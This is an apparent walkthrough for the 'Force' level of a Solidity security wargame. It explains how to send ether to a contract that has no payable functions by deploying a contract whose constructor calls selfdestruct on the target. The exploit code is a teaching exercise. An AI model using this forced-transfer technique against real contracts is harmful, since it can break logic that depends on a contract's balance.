# 07. Force

The goal of this level is to make the balance of the contract greater than zero.

## Target contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

## Vulnerability

There is nothing in this contract so there is no vulnerability...

You may try to send funds through your wallet or programatically with .call .send or .transfer but it will not work.
This contract hasn't got a single function, not even a fallback or receive one.

How to force a transfer ?

The only way is `selfdestruct` which will bypass any check and transfer the funds to the targetted address.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceTransfer {
    
    constructor(address _targetContract) payable {
        selfdestruct(payable(_targetContract));
    }
    
}
```

Deploying the above contract with the target contract as parameter and setting a value to the deployement transaction will solve the challenge.
